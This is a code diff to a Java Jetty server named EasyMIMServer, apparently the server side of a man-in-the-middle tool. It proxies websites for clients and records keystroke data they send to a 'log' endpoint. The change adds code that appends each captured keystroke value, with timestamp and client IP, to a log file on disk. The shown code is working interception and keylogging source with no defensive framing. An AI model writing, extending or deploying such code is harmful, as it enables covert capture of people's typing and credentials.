@@ -1,6 +1,9 @@
 package Server;
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -41,16 +44,12 @@ public class EasyMIMServer {
 	public Server server;
 	public ServletContextHandler context;
 	public WebsiteProcessor wp;
+	public EasyMIMConfig config;
+	public Object lock = new Object();
 	
-	static class EasyMIMServlet extends HttpServlet
+	class EasyMIMServlet extends HttpServlet
 	{
-		HashMap<String,ClientInfo> sessions;
-		WebsiteProcessor wp;
-		ClientInfo ci;
-	    public EasyMIMServlet(HashMap<String,ClientInfo> sessions,WebsiteProcessor wp){
-	    	this.sessions = sessions;
-	    	this.wp = wp;
-	    }
+	    public EasyMIMServlet(){}
 	    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
 	    {
 	    	try{
@@ -58,19 +57,39 @@ public class EasyMIMServer {
 		    		sessions.put(request.getRemoteAddr(),new ClientInfo());
 		    	}
 		    	if(request.getRequestURI().contains("log")){
-		    		Gson gson = new Gson();
-		    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
-		    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
-		    		//log ket stroke data
-		    		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
-		    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")");
+		    		synchronized(lock){
+			    		Gson gson = new Gson();
+			    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
+			    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
+			    		//log ket stroke data
+			    		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
+			    		try {
+			    			 
+			    			String content = new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")";
+			     
+			    			File file = new File(config.logSavePath);
+			     
+			    			// if file doesnt exists, then create it
+			    			if (!file.exists()) {
+			    				file.createNewFile();
+			    			}
+			     
+			    			FileWriter fw = new FileWriter(file.getAbsoluteFile(),true);
+			    			BufferedWriter bw = new BufferedWriter(fw);
+			    			bw.append(content);
+			    			bw.close();
+			     
+			     
+			    		} catch (IOException e) {
+			    			e.printStackTrace();
+			    		}
+			    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")");
+		    		}
 		    		return;
 		    	}
-		    	//log website visit
-		    	//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+request.getRequestURL()+")");
-		    	ci = sessions.get(request.getRemoteAddr());
+		    	ClientInfo ci = sessions.get(request.getRemoteAddr());
 				response.setStatus(HttpServletResponse.SC_OK);
-				wp.processRequest(request, response,this.ci);
+				wp.processRequest(request, response,ci);
 	    	}catch(Exception e){
 	    		
 	    	}
@@ -93,13 +112,13 @@ public class EasyMIMServer {
         context = new ServletContextHandler();
         context.setContextPath("/");
         server.setHandler(context);
-        context.addServlet(new ServletHolder(new EasyMIMServlet(this.sessions, this.wp)),"/*");
+        context.addServlet(new ServletHolder(new EasyMIMServlet()),"/*");
 	}
 	public EasyMIMServer(){
-        wp = new WebsiteProcessor();
-        this.setUpServer();
+		this(new EasyMIMConfig());
 	}
 	public EasyMIMServer(EasyMIMConfig config){
+		this.config = config;
 		wp = new WebsiteProcessor(config);
 		this.setUpServer();
 	}
